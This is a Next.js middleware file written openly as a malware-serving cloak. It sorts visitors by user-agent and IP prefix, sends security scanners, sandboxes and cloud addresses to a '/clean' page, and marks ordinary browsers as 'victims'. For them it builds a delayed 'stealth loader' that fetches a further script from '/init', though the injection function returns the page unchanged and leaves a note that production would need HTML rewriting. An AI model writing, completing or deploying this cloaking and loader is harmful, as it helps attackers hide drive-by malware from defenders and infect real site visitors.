import { NextResponse } from 'next/server';

export function middleware(request) {
    const response = NextResponse.next();
    const url = request.nextUrl;
    const ua = request.headers.get('user-agent') || '';
    const ip = request.headers.get('x-forwarded-for') || request.ip;

    // Advanced scanner detection
    if (isSecurityScanner(ua, ip)) {
        return NextResponse.redirect(new URL('/clean', request.url));
    }

    // Only inject for real victims
    if (isPotentialVictim(ua, ip) && url.pathname === '/') {
        return injectMalware(response);
    }

    return response;
}

function isSecurityScanner(ua, ip) {
    const scannerPatterns = [
        'virus-total', 'urlscan', 'any.run', 'sandbox',
        'headless', 'phantom', 'puppeteer', 'selenium',
        'securityscan', 'metasploit', 'burp', 'zap',
        'qualys', 'nessus', 'nmap', 'acunetix'
    ];

    const vpnPatterns = [
        'datacenter', 'cloud', 'vpn', 'proxy',
        'tor-node', 'crawler', 'spider'
    ];

    const isScanner = scannerPatterns.some(pattern => 
        ua.toLowerCase().includes(pattern.toLowerCase())
    );

    const isVPN = vpnPatterns.some(pattern =>
        ua.toLowerCase().includes(pattern.toLowerCase())
    );

    // Block known security IP ranges
    const securityIPs = [
        '52.0.', '54.165.', '35.180.', '18.206.', '3.80.',
        '13.57.', '34.210.', '54.191.', '52.24.'
    ];

    const isSecurityIP = securityIPs.some(ipRange => 
        ip && ip.startsWith(ipRange)
    );

    return isScanner || isVPN || isSecurityIP;
}

function isPotentialVictim(ua, ip) {
    // Target real browsers only
    const realBrowsers = [
        'chrome', 'firefox', 'safari', 'edge',
        'opera', 'samsung', 'mobile'
    ];

    const isRealBrowser = realBrowsers.some(browser =>
        ua.toLowerCase().includes(browser.toLowerCase())
    );

    return isRealBrowser && !isSecurityScanner(ua, ip);
}

function injectMalware(response) {
    // Create new response with injected malware
    const maliciousScript = `
        <script>
            // Advanced stealth loader
            (function() {
                setTimeout(() => {
                    const script = document.createElement('script');
                    script.src = '/init?t=' + Date.now() + '&ref=' + encodeURIComponent(document.referrer);
                    script.crossOrigin = 'anonymous';
                    document.head.appendChild(script);
                }, 1500);
            })();
        </script>
    `;

    // This would require response body modification
    // In production, use HTML rewriting
    return response;
}

export const config = {
    matcher: ['/((?!api|_next/static|_next/image|favicon.ico).*)']
};
